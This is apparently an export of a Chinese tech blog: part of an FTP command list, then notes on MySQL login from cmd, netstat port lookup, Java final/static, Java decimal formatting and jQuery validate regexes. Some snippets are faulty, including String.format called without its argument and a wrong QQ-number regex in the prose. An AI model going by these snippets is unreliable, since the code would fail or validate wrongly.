<p>52.rstatus[file-name]：若未指定文件名，则显示远程主机的状态， 否则显示文件状态。</p>
<p>53.rename[from][to]：更改远程主机文件名。</p>
<p>54.reset：清除回答队列。</p>
<p>55.restart marker：从指定的标志 marker 处，重新开始 get 或 put，如：restart 130。</p>
<p>56.rmdir dir-name：删除远程主机目录。</p>
<p>57.runique：设置文件名只一性存储，若文件存在，则在原文件后加后缀.1， .2 等。</p>
<p>58.send local-file[remote-file]：同 put。</p>
<p>59.sendport：设置 PORT 命令的使用。</p>
<p>60.site arg1，arg2…：将参数作为 SITE 命令逐字发送至远程 ftp 主机。</p>
<p>61.size file-name：显示远程主机文件大小，如：site idle 7200。</p>
<p>62.status：显示当前 ftp 状态。</p>
<p>63.struct[struct-name]：将文件传输结构设置为 struct-name， 缺省时使用 stream 结构。</p>
<p>64.sunique：将远程主机文件名存储设置为只一(与 runique 对应)。</p>
<p>65.system：显示远程主机的操作系统类型。</p>
<p>66.tenex：将文件传输类型设置为 TENEX 机的所需的类型。</p>
<p>67.tick：设置传输时的字节计数器。</p>
<p>68.trace：设置包跟踪。</p>
<p>69.type[type-name]：设置文件传输类型为 type-name，缺省为 ascii，如:type binary，设置二进制传输方式。</p>
<p>70.umask[newmask]：将远程服务器的缺省 umask 设置为 newmask，如：umask 3</p>
<p>71.user user-name[password][account]：向远程主机表明自己的身份，需要口令时，必须输入口令，如：user anonymous my@email。</p>
<p>72.verbose：同命令行的-v 参数，即设置详尽报告方式，ftp 服务器的所有响 应都将显示给用户，缺省为 on.</p>
<p>73.?[cmd]：同 help.</p>
]]></content>
      <categories>
        <category>windows</category>
      </categories>
      <tags>
        <tag>windows</tag>
      </tags>
  </entry>
  <entry>
    <title>Windows下使用DOS命令进入MySQL数据库</title>
    <url>/2021/05/15/Windows%E4%B8%8B%E4%BD%BF%E7%94%A8DOS%E5%91%BD%E4%BB%A4%E8%BF%9B%E5%85%A5MySQL%E6%95%B0%E6%8D%AE%E5%BA%93/</url>
    <content><![CDATA[<h1 id="Windows-下使用-DOS-命令进入-MySQL-数据库"><a href="#Windows-下使用-DOS-命令进入-MySQL-数据库" class="headerlink" title="Windows 下使用 DOS 命令进入 MySQL 数据库"></a><a href="https://www.cnblogs.com/isme-zjh/p/11400722.html">Windows 下使用 DOS 命令进入 MySQL 数据库</a></h1><h2 id="1、进入-cmd"><a href="#1、进入-cmd" class="headerlink" title="1、进入 cmd"></a>1、进入 cmd</h2><p>桌面左下角 windows 图标–搜索框内输入<strong>cmd</strong>，点击<strong>cmd.exe</strong>，或者使用快捷键 Windows 键（在键盘上有个 Windows 标志的按键）+R 输入 cmd 后回车。</p>
<h2 id="2、启动-mysql-数据库："><a href="#2、启动-mysql-数据库：" class="headerlink" title="2、启动 mysql 数据库："></a>2、启动 mysql 数据库：</h2><p>在出来的 DOS 命令窗口中输入</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">net start mysql</span><br></pre></td></tr></table></figure>

<p>或者使用快捷键 Windows 键（在键盘上有个 Windows 标志的按键）+ R 直接输入<strong>net start mysql</strong>后回车。（另附：关闭的命令为<strong>net stop mysql</strong>）</p>
<h2 id="3、进入-mysql-数据库"><a href="#3、进入-mysql-数据库" class="headerlink" title="3、进入 mysql 数据库"></a>3、进入 mysql 数据库</h2><p>在 DOS 命令窗口输入</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">mysql -h localhost -u root -p</span><br></pre></td></tr></table></figure>

<p>进入 mysql 数据库，</p>
<p>其中**-h**表示服务器名，localhost 表示本地；</p>
<p><strong>-u</strong>为数据库用户名，root 是 mysql 默认用户名；</p>
<p><strong>-p</strong>为密码，如果设置了密码，可直接在**-p**后链接输入，如：-<strong>p123456</strong>，用户没有设置密码，显示 Enter password 时，直接回车即可。</p>
<p>注意，如果你的 mysql 没有安装在 C 盘下，你需要先使用 DOS 命令进入 mysql 的安装目录下的 bin 目录中。以我的电脑为例，方法如下：输入<strong>D:<strong>进入 D 盘，在输入</strong>cd D:\Tools\M</strong></p>
<h2 id="4、成功进入"><a href="#4、成功进入" class="headerlink" title="4、成功进入"></a>4、成功进入</h2><p>显示 welcome</p>
<h2 id="5、操作数据库"><a href="#5、操作数据库" class="headerlink" title="5、操作数据库"></a>5、操作数据库</h2><p>输入<strong>show databases；</strong>显示你有的数据库（mysql 数据库中的命令必须以分号结尾“；”）</p>
<h2 id="执行-sql-文件"><a href="#执行-sql-文件" class="headerlink" title="执行 sql 文件"></a>执行 sql 文件</h2><p>执行 sql 文件，&#x2F;usr&#x2F;t_user_alpha.sql 路径是 mysql 客户端的路径，mysql 命令行中输入路径按 Tab 键是不会自动补全的，需要自己敲</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">MySQL [e_user]&gt; source /usr/t_user_alpha.sql</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>数据库</category>
        <category>SQL</category>
      </categories>
      <tags>
        <tag>数据库</tag>
        <tag>SQL</tag>
      </tags>
  </entry>
  <entry>
    <title>Windows如何查看某个端口被谁占用</title>
    <url>/2021/05/15/Windows%E5%A6%82%E4%BD%95%E6%9F%A5%E7%9C%8B%E6%9F%90%E4%B8%AA%E7%AB%AF%E5%8F%A3%E8%A2%AB%E8%B0%81%E5%8D%A0%E7%94%A8/</url>
    <content><![CDATA[<h1 id="Windows-如何查看某个端口被谁占用"><a href="#Windows-如何查看某个端口被谁占用" class="headerlink" title="Windows 如何查看某个端口被谁占用"></a>Windows 如何查看某个端口被谁占用</h1><p>1、开始—-&gt;运行—-&gt;cmd，</p>
<p>或者是 window+R 组合键，调出命令窗口</p>
<p>2、 输入命令：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">netstat -ano</span><br></pre></td></tr></table></figure>

<p>列出所有端口的情况。在列表中我们观察被占用的端口，比如是 49157，首先找到它。</p>
<p>3、查看被占用端口对应的 PID，</p>
<p>输入命令：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">netstat -aon|findstr &quot;49157&quot;</span><br></pre></td></tr></table></figure>

<p>回车，记下最后一位数字，即 PID,这里是 2720。</p>
<p>4、 继续输入</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tasklist|findstr &quot;2720&quot;</span><br></pre></td></tr></table></figure>

<p>回车，查看是哪个进程或者程序占用了 2720 端口，结果是：svchost.exe</p>
<p>5、结束该进程：在任务管理器中选中该进程点击”结束进程“按钮，或者是在 cmd 的命令窗口中输入：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">taskkill /f /t /im Tencentdl.exe。</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>windows</category>
      </categories>
      <tags>
        <tag>windows</tag>
      </tags>
  </entry>
  <entry>
    <title>final关键字和static关键字的联系与区别</title>
    <url>/2021/05/15/final%E5%85%B3%E9%94%AE%E5%AD%97%E5%92%8Cstatic%E5%85%B3%E9%94%AE%E5%AD%97%E7%9A%84%E8%81%94%E7%B3%BB%E4%B8%8E%E5%8C%BA%E5%88%AB/</url>
    <content><![CDATA[<h1 id="final-关键字和-static-关键字的联系与区别"><a href="#final-关键字和-static-关键字的联系与区别" class="headerlink" title="final 关键字和 static 关键字的联系与区别"></a>final 关键字和 static 关键字的联系与区别</h1><h2 id="一、修饰变量"><a href="#一、修饰变量" class="headerlink" title="一、修饰变量"></a>一、修饰变量</h2><h3 id="1、final（不可改变）"><a href="#1、final（不可改变）" class="headerlink" title="1、final（不可改变）"></a>1、final（不可改变）</h3><p>（1）在运行时被初始化；</p>
<p>（2）final 修饰的变量在编译时不可改变——编译时常量；</p>
<p>（3）可修饰的变量有静态变量、实例变量、局部变量；</p>
<p>（4）被 final 修饰的变量是一个常量，只能赋值一次；</p>
<p>（5）”空白 final“：在声明 final 变量时未被赋值。无论什么情况，编译器都确保 final 在使用前必须被初始化；</p>
<p>（6）当 final 修饰的是对象的引用时，final 会使引用恒定不变。一旦引用被初始化指向一个对象，就无法再把它再指向另一个对象，然而对象其自身却是可以被修改的，Java 并未提供使任何对象恒定不变的途径。</p>
<h3 id="2、static"><a href="#2、static" class="headerlink" title="2、static"></a>2、static</h3><p>（在内存中只存在一份，相当于“全局变量”；随类的加载而加载，随类的消失而消失，生命周期最长）</p>
<p>（1）类变量随着类的加载而存在于方法区中；</p>
<p>（2）实例变量随着对象的建立而存在于堆内存中。</p>
<h2 id="二、修饰方法"><a href="#二、修饰方法" class="headerlink" title="二、修饰方法"></a>二、修饰方法</h2><h3 id="1、final"><a href="#1、final" class="headerlink" title="1、final"></a>1、final</h3><p>（1）锁定方法，以防任何继承类覆写该方法；所有的 private 方法都隐式地指定为是 final；</p>
<p>（2）提高效率：在 java 早期实现中，若为 final 修饰的方法，则代表编译器针对该方法的所有调用都为内嵌调用。但是在使用 Java SE5&#x2F;6 时，应该让编译器和 JVM 去处理效率问题，只有在想要明确禁止覆盖时，才将方法设置为 final 的。</p>
<p>（3）将方法声明为 final 的原因还有一点是“关闭”动态绑定，这样编译器就可以为 final 方法调用生成更有效的代码。然而，大多数情况下，这样做对程序的整体性能不会有什么改观。所以，最好根据设计来决定是否使用 final，而不是出于试图提高性能的目的来使用 final。</p>
<p>前期绑定：在程序执行前进行绑定（由编译器和连接程序实现）——C 语言默认使用；</p>
<p>后期绑定：在运行时根据对象的类型进行绑定——Java 中除了 static 和 final 方法之外，其他所有的方法都是后期绑定。</p>
<h3 id="2、static-1"><a href="#2、static-1" class="headerlink" title="2、static"></a>2、static</h3><p>（1）静态方法只能访问静态成员（变量、方法）；</p>
<p>（2）静态方法可以直接通过类名调用，任何的实例也都可以调用，因此静态方法中不能用 this 和 super 关键字，不能直接访问所属类的实例变量和实例方法，只能访问所属类的静态成员变量和成员方法。</p>
<h2 id="三、修饰类"><a href="#三、修饰类" class="headerlink" title="三、修饰类"></a>三、修饰类</h2><h3 id="1、final-1"><a href="#1、final-1" class="headerlink" title="1、final"></a>1、final</h3><p>（1）被 final 修饰的类不能被继承，打破了封装性；</p>
<p>（2）final 类中所有的方法都隐式地指定为是 final 的。</p>
<h3 id="2、static-2"><a href="#2、static-2" class="headerlink" title="2、static"></a>2、static</h3><p>（1）不可修饰类，只可修饰变量和方法；</p>
<p>（2）被 static 修饰的成员变量和成员方法独立于该类的任何对象。也就是说，它不依赖类特定的实例，被类的所有实例共享。只要这个类被加载，Java 虚拟机就能根据类名在运行时数据区的方法区内定找到他们。因此，static 对象可以在它的任何对象创建之前访问，无需引用任何对象。</p>
<p>原文链接：<a href="https://blog.csdn.net/yuezhiyun123/article/details/51545500">https://blog.csdn.net/yuezhiyun123/article/details/51545500</a></p>
]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>Java</tag>
      </tags>
  </entry>
  <entry>
    <title>java使double保留两位小数的多方法</title>
    <url>/2021/05/15/java%E4%BD%BFdouble%E4%BF%9D%E7%95%99%E4%B8%A4%E4%BD%8D%E5%B0%8F%E6%95%B0%E7%9A%84%E5%A4%9A%E6%96%B9%E6%B3%95/</url>
    <content><![CDATA[<h1 id="java-使-double-保留两位小数的多方法"><a href="#java-使-double-保留两位小数的多方法" class="headerlink" title="java 使 double 保留两位小数的多方法 "></a><a href="https://www.cnblogs.com/aipan/p/8022312.html">java 使 double 保留两位小数的多方法 </a></h1><p>推荐方式：Double.valueOf(String.format())</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">    <span class="type">double</span> test1=<span class="number">10.2234</span>;</span><br><span class="line">    <span class="type">double</span> test2=<span class="number">10.3356</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">Double</span> <span class="variable">dtest1</span> <span class="operator">=</span> Double.valueOf(String.format(<span class="string">&quot;%.2f&quot;</span>, test1 ));</span><br><span class="line"></span><br><span class="line">    <span class="type">Double</span> <span class="variable">dtest2</span> <span class="operator">=</span> Double.valueOf(String.format(<span class="string">&quot;%.2f&quot;</span>, test2 ));</span><br><span class="line"></span><br><span class="line">    System.out.println(dtest1 );</span><br><span class="line">    System.out.println(dtest2 );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>结果如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">10.22</span></span><br><span class="line"><span class="number">10.34</span></span><br></pre></td></tr></table></figure>

<p>代码如下:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">DecimalFormat</span>  <span class="variable">df</span>  <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DecimalFormat</span>(<span class="string">&quot;######0.00&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="type">double</span> <span class="variable">d1</span> <span class="operator">=</span> <span class="number">3.23456</span></span><br><span class="line"><span class="type">double</span> <span class="variable">d2</span> <span class="operator">=</span> <span class="number">0.0</span>;</span><br><span class="line"><span class="type">double</span> <span class="variable">d3</span> <span class="operator">=</span> <span class="number">2.0</span>;</span><br><span class="line">df.format(d1);</span><br><span class="line">df.format(d2);</span><br><span class="line">df.format(d3);</span><br></pre></td></tr></table></figure>

<p>3 个结果分别为:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">3.23</span></span><br><span class="line"><span class="number">0.00</span></span><br><span class="line"><span class="number">2.00</span></span><br></pre></td></tr></table></figure>

<h2 id="java-保留两位小数问题："><a href="#java-保留两位小数问题：" class="headerlink" title="java 保留两位小数问题："></a>java 保留两位小数问题：</h2><h3 id="方式一：四舍五入"><a href="#方式一：四舍五入" class="headerlink" title="方式一：四舍五入"></a>方式一：四舍五入</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">double</span>  <span class="variable">f</span>  <span class="operator">=</span>  <span class="number">111231.5585</span>;</span><br><span class="line"><span class="type">BigDecimal</span>  <span class="variable">b</span>  <span class="operator">=</span>  <span class="keyword">new</span>  <span class="title class_">BigDecimal</span>(f);</span><br><span class="line"><span class="type">double</span>  <span class="variable">f1</span>  <span class="operator">=</span>  b.setScale(<span class="number">2</span>,  BigDecimal.ROUND_HALF_UP).doubleValue();</span><br></pre></td></tr></table></figure>

<p>保留两位小数</p>
<h3 id="方式二：DecimalFormat"><a href="#方式二：DecimalFormat" class="headerlink" title="方式二：DecimalFormat"></a>方式二：DecimalFormat</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">new</span> <span class="title class_">java</span>.text.DecimalFormat(<span class="string">&quot;#.00&quot;</span>).format(<span class="number">3.1415926</span>)</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">DecimalFormat df=<span class="keyword">new</span> <span class="title class_">DecimalFormat</span>(<span class="string">&quot;.##&quot;</span>);</span><br><span class="line"><span class="type">double</span> d=<span class="number">1252.2563</span>;</span><br><span class="line">String st=df.format(d);</span><br><span class="line">System.out.println(st);</span><br></pre></td></tr></table></figure>

<p>#.00 表示两位小数 #.0000 四位小数 以此类推…</p>
<h3 id="方式三：String-format"><a href="#方式三：String-format" class="headerlink" title="方式三：String.format"></a>方式三：String.format</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">double</span> <span class="variable">d</span> <span class="operator">=</span> <span class="number">3.1415926</span>;</span><br><span class="line"><span class="type">String</span> <span class="variable">result</span> <span class="operator">=</span> String.format(<span class="string">&quot;%.2f&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>%.2f %. 表示 小数点前任意位数  2 表示两位小数 格式后的结果为 f 表示浮点型</p>
<h3 id="方式四：NumberFormat"><a href="#方式四：NumberFormat" class="headerlink" title="方式四：NumberFormat"></a>方式四：NumberFormat</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">NumberFormat ddf1=NumberFormat.getNumberInstance() ;</span><br><span class="line"><span class="keyword">void</span> <span class="title function_">setMaximumFractionDigits</span><span class="params">(<span class="type">int</span> digits)</span></span><br></pre></td></tr></table></figure>

<p>digits 显示的数字位数</p>
<p>为格式化对象设定小数点后的显示的最多位,显示的最后位是舍入的</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">TT</span> &#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String args[])</span> &#123;</span><br><span class="line">    <span class="type">double</span> x=<span class="number">23.5455</span>;</span><br><span class="line">    NumberFormat ddf1=NumberFormat.getNumberInstance() ;</span><br><span class="line">	ddf1.setMaximumFractionDigits(<span class="number">2</span>);</span><br><span class="line">	String s= ddf1.format(x) ;</span><br><span class="line">	System.out.print(s);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>Java</tag>
      </tags>
  </entry>
  <entry>
    <title>jquery validate实现表单验证 （正则表达式）</title>
    <url>/2021/05/13/jquery%20validate%E5%AE%9E%E7%8E%B0%E8%A1%A8%E5%8D%95%E9%AA%8C%E8%AF%81%20%EF%BC%88%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%EF%BC%89/</url>
    <content><![CDATA[<h1 id="一、目的"><a href="#一、目的" class="headerlink" title="一、目的"></a>一、目的</h1><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">为了更好地实现人机交互，使用jQuery封装库中的validate插件，在用户填写表单时，可以快速地对用户填写的数据进行验证，并做出反馈。</span><br></pre></td></tr></table></figure>

<h1 id="二、validate-插件简介"><a href="#二、validate-插件简介" class="headerlink" title="二、validate 插件简介"></a>二、validate 插件简介</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">validate()是插件的核心方法，定义了基本的校验规则和一些有用的配置项。</span><br></pre></td></tr></table></figure>

<p>rule:设置表单的验证规则；<br>messages:设置表单不符合验证规则的提示信息；<br>debug:如果这个参数为 true,那么表单还会提交，只进行检查，调试时十分方便。</p>
<p>required:必填<br>minlength:最小长度<br>maxlength:最大长度<br>rangelength:长度范围，以数组呈现[2，10]，表示表单输入长度为 2 到 10 位<br>remote:可以通过发现 GET 或者 POST 请求进行远程验证，与 Ajax 的验证进行比较。就是通过</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">ajax实现的</span><br><span class="line">｛</span><br><span class="line">    <span class="attr">url</span>:</span><br><span class="line">    <span class="attr">type</span>:默认为<span class="variable constant_">GET</span>请求</span><br><span class="line">    <span class="attr">data</span>:发送的数据</span><br><span class="line">｝</span><br><span class="line">发送<span class="variable constant_">GET</span>请求例子：</span><br><span class="line"><span class="attr">check</span>:&#123;</span><br><span class="line">       <span class="attr">required</span>:<span class="literal">true</span>,</span><br><span class="line">       <span class="attr">remote</span>:&#123;</span><br><span class="line">       <span class="attr">url</span>:<span class="string">&quot;__CONTROLLER__/check?check=&quot;</span>+$(<span class="string">&quot;#icode&quot;</span>).<span class="property">val</span></span><br><span class="line">       <span class="comment">//__CONTROLLER__表示当前控制器</span></span><br><span class="line">       &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="基本的校验规则"><a href="#基本的校验规则" class="headerlink" title="基本的校验规则"></a>基本的校验规则</h2><p>序号 规则 描述<br>1 required:true 必须输入的字段。<br>2 remote:”check.php” 使用 ajax 方法调用 check.php 验证输入值。<br>3 email:true 必须输入正确格式的电子邮件。<br>4 url:true 必须输入正确格式的网址。<br>5 date:true 必须输入正确格式的日期。日期校验 ie6 出错，慎用。<br>6 dateISO:true 必须输入正确格式的日期（ISO），例如：2009-06-23，1998&#x2F;01&#x2F;22。只验证格式，不验证有效性。<br>7 number:true 必须输入合法的数字（负数，小数）。<br>8 digits:true 必须输入整数。<br>9 creditcard: 必须输入合法的信用卡号。<br>10 equalTo:”#field” 输入值必须和 #field 相同。<br>11 accept: 输入拥有合法后缀名的字符串（上传文件的后缀）。<br>12 maxlength:5 输入长度最多是 5 的字符串（汉字算一个字符）。<br>13 minlength:10 输入长度最小是 10 的字符串（汉字算一个字符）。<br>14 rangelength:[5,10] 输入长度必须介于 5 和 10 之间的字符串（汉字算一个字符）。<br>15 range:[5,10] 输入值必须介于 5 和 10 之间。<br>16 max:5 输入值不能大于 5。<br>17 min:10 输入值不能小于 10。</p>
<h2 id="validator-对象"><a href="#validator-对象" class="headerlink" title="validator 对象"></a>validator 对象</h2><p>validator.form()验证表单是否有效，返回 true 或者 false;<br>validator.element(element)验证表单中某个元素是否有效，返回 true 或者 false;<br>validator.resetForm()把表单恢复到验证前原来的状态；<br>validator.showErrors(error)针对元素显示特定的错误信息；<br>validator.numberOfInvalids()返回无效的元素数量；</p>
<h2 id="validator-对象的静态方法"><a href="#validator-对象的静态方法" class="headerlink" title="validator 对象的静态方法"></a>validator 对象的静态方法</h2><p>jQuery.validator.addMethod()增加自定义的验证方法;  （即$.validator.addMethod()）<br>jQuery.validator.format()格式化字符串，用参数代替模板中的｛n｝;<br>jQuery.validator.setDefaults()修改插件默认设计；<br>jQuery.validator.addClassRules()为某些包含名为 name 的 class 增加组合验证类型。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">$.validator.<span class="title function_">addClassRules</span>(&#123;</span><br><span class="line">  <span class="attr">txt</span>: &#123;</span><br><span class="line">    <span class="attr">required</span>: <span class="literal">true</span>,</span><br><span class="line">    <span class="attr">rangelength</span>: [<span class="number">2</span>, <span class="number">10</span>],</span><br><span class="line">  &#125;,</span><br><span class="line">&#125;); <span class="comment">//这时class=&quot;txt&quot;的类都具备了这个两个验证规则</span></span><br></pre></td></tr></table></figure>

<p>获取表单元素的验证规则：    $(“#username”).rules();<br>为表单元素添加验证规则：    $(“#username”).rules(‘add’,rules);<br>为表单元素删除验证规则：    $(“#username”).rules(‘remove’,rules);</p>
<h1 id="三、正则表达式"><a href="#三、正则表达式" class="headerlink" title="三、正则表达式"></a>三、正则表达式</h1><p>常用正则表达式：<br>用户名的正则表达式验证：<code>/^[\w\u4e00-\u9fa5]&#123;2,10&#125;/g</code>(含汉字)<br>用户名验证：<code>/^\w&#123;2,10&#125;$/</code>(不含汉字，只允许英文字母、数字和下画线，长度为 2-10 位)<br>QQ 号验证:<code>/^[1,9][0,9]&#123;4,19&#125;$/</code>（第一位数字不为 0，5-19 位数字）<br>邮箱验证：&#x2F;<a href="#fn1">[1]</a>+@([a-z0-9]+.)+[a-z]{2,4}&#x2F;(只允许 6-16 位英文字母、数字和下画线)<br>手机号验证：&#x2F;^1[3,5,7,8]\d{9}&#x2F;i</p>
<h2 id="代码："><a href="#代码：" class="headerlink" title="代码："></a>代码：</h2><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">$(<span class="variable language_">document</span>).<span class="title function_">ready</span>(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">  $(<span class="string">&quot;#table&quot;</span>).<span class="title function_">validate</span>(&#123;</span><br><span class="line">    <span class="attr">rules</span>: &#123;</span><br><span class="line">      <span class="attr">admin_name</span>: &#123;</span><br><span class="line">        <span class="attr">required</span>: <span class="literal">true</span>,</span><br><span class="line">        <span class="attr">checkName</span>: <span class="literal">true</span>,</span><br><span class="line">      &#125;,</span><br><span class="line">      <span class="attr">name</span>: &#123;</span><br><span class="line">        <span class="attr">required</span>: <span class="literal">true</span>,</span><br><span class="line">      &#125;,</span><br><span class="line">      <span class="attr">admin_pwd</span>: &#123;</span><br><span class="line">        <span class="attr">required</span>: <span class="literal">true</span>,</span><br><span class="line">        <span class="attr">checkPwd</span>: <span class="literal">true</span>,</span><br><span class="line">      &#125;,</span><br><span class="line">      <span class="attr">con_pwd</span>: &#123;</span><br><span class="line">        <span class="attr">required</span>: <span class="literal">true</span>,</span><br><span class="line">        <span class="attr">equalTo</span>: admin_pwd,</span><br><span class="line">      &#125;,</span><br><span class="line">      <span class="attr">email</span>: &#123;</span><br><span class="line">        <span class="attr">required</span>: <span class="literal">true</span>,</span><br><span class="line">        <span class="attr">checkEmail</span>: <span class="literal">true</span>,</span><br><span class="line">      &#125;,</span><br><span class="line">      <span class="attr">qq</span>: &#123;</span><br><span class="line">        <span class="attr">required</span>: <span class="literal">true</span>,</span><br><span class="line">        <span class="attr">checkQQ</span>: <span class="literal">true</span>,</span><br><span class="line">      &#125;,</span><br><span class="line">      <span class="attr">s_page</span>: &#123;</span><br><span class="line">        <span class="attr">url</span>: <span class="literal">true</span>,</span><br><span class="line">      &#125;,</span><br><span class="line">      <span class="attr">check</span>: &#123;</span><br><span class="line">        <span class="comment">//required:true,</span></span><br><span class="line">        <span class="comment">//remote:&#123;</span></span><br><span class="line">        <span class="comment">//url:&quot;__CONTROLLER__/check?check=&quot;+$(&quot;#icode&quot;).val,</span></span><br><span class="line">        <span class="comment">//__CONTROLLER__表示当前控制器</span></span><br><span class="line">        <span class="comment">//dataType:&quot;json&quot;,</span></span><br><span class="line">        <span class="comment">//&#125;</span></span><br><span class="line">      &#125;,</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">messages</span>: &#123;</span><br><span class="line">      <span class="attr">admin_name</span>: &#123;</span><br><span class="line">        <span class="attr">required</span>: <span class="string">&quot;*必填！&quot;</span>,</span><br><span class="line">        <span class="attr">rangelength</span>: <span class="string">&quot;*长度为2到10位！&quot;</span>,</span><br><span class="line">      &#125;,</span><br><span class="line">      <span class="attr">name</span>: &#123;</span><br><span class="line">        <span class="attr">required</span>: <span class="string">&quot;*必填！&quot;</span>,</span><br><span class="line">      &#125;,</span><br><span class="line">      <span class="attr">admin_pwd</span>: &#123;</span><br><span class="line">        <span class="attr">required</span>: <span class="string">&quot;*必填！&quot;</span>,</span><br><span class="line">        <span class="attr">rangelength</span>: <span class="string">&quot;*长度为6到16位！&quot;</span>,</span><br><span class="line">      &#125;,</span><br><span class="line">      <span class="attr">con_pwd</span>: &#123;</span><br><span class="line">        <span class="attr">required</span>: <span class="string">&quot;*必填！&quot;</span>,</span><br><span class="line">        <span class="attr">equalTo</span>: <span class="string">&quot;*两次输入的密码不一致！&quot;</span>,</span><br><span class="line">      &#125;,</span><br><span class="line">      <span class="attr">email</span>: &#123;</span><br><span class="line">        <span class="attr">required</span>: <span class="string">&quot;*必填！&quot;</span>,</span><br><span class="line">        <span class="attr">email</span>: <span class="string">&quot;*请输入正确的邮箱！&quot;</span>,</span><br><span class="line">      &#125;,</span><br><span class="line">      <span class="attr">qq</span>: &#123;</span><br><span class="line">        <span class="attr">required</span>: <span class="string">&quot;*必填！&quot;</span>,</span><br><span class="line">      &#125;,</span><br><span class="line">      <span class="attr">s_page</span>: &#123;</span><br><span class="line">        <span class="attr">url</span>: <span class="string">&quot;*请输入正确的网页地址！&quot;</span>,</span><br><span class="line">      &#125;,</span><br><span class="line">      <span class="attr">check</span>: &#123;</span><br><span class="line">        <span class="attr">required</span>: <span class="string">&quot;*必填！&quot;</span>,</span><br><span class="line">        <span class="attr">remote</span>: <span class="string">&quot;*验证码有误！&quot;</span>,</span><br><span class="line">      &#125;,</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="comment">//是否在获取焦点时验证</span></span><br><span class="line">    <span class="comment">//onfocusout:false,</span></span><br><span class="line">    <span class="comment">//是否在敲击键盘时验证</span></span><br><span class="line">    <span class="comment">//onkeyup:false,</span></span><br><span class="line">    <span class="comment">//提交表单后，（第一个）未通过验证的表单获得焦点</span></span><br><span class="line">    <span class="attr">focusInvalid</span>: <span class="literal">true</span>,</span><br><span class="line">    <span class="comment">//当未通过验证的元素获得焦点时，移除错误提示</span></span><br><span class="line">    <span class="attr">focusCleanup</span>: <span class="literal">true</span>,</span><br><span class="line">  &#125;);</span><br><span class="line"></span><br><span class="line">  <span class="comment">//自定义正则表达示验证方法</span></span><br><span class="line">  $.validator.<span class="title function_">addMethod</span>(</span><br><span class="line">    <span class="string">&quot;checkQQ&quot;</span>,</span><br><span class="line">    <span class="keyword">function</span> (<span class="params">value, element, params</span>) &#123;</span><br><span class="line">      <span class="keyword">var</span> checkQQ = <span class="regexp">/^[1-9][0-9]&#123;4,19&#125;$/</span>;</span><br><span class="line">      <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="title function_">optional</span>(element) || checkQQ.<span class="title function_">test</span>(value);</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="string">&quot;*请输入正确的QQ号码！&quot;</span></span><br><span class="line">  );</span><br><span class="line"></span><br><span class="line">  $.validator.<span class="title function_">addMethod</span>(</span><br><span class="line">    <span class="string">&quot;checkEmail&quot;</span>,</span><br><span class="line">    <span class="keyword">function</span> (<span class="params">value, element, params</span>) &#123;</span><br><span class="line">      <span class="keyword">var</span> checkEmail = <span class="regexp">/^[a-z0-9]+@([a-z0-9]+\.)+[a-z]&#123;2,4&#125;$/i</span>;</span><br><span class="line">      <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="title function_">optional</span>(element) || checkEmail.<span class="title function_">test</span>(value);</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="string">&quot;*请输入正确的邮箱！&quot;</span></span><br><span class="line">  );</span><br><span class="line"></span><br><span class="line">  $.validator.<span class="title function_">addMethod</span>(</span><br><span class="line">    <span class="string">&quot;checkName&quot;</span>,</span><br><span class="line">    <span class="keyword">function</span> (<span class="params">value, element, params</span>) &#123;</span><br><span class="line">      <span class="keyword">var</span> checkName = <span class="regexp">/^\w&#123;2,10&#125;$/g</span>;</span><br><span class="line">      <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="title function_">optional</span>(element) || checkName.<span class="title function_">test</span>(value);</span><br><span class="line">    &#125;,</span><br><span class="line">    <span 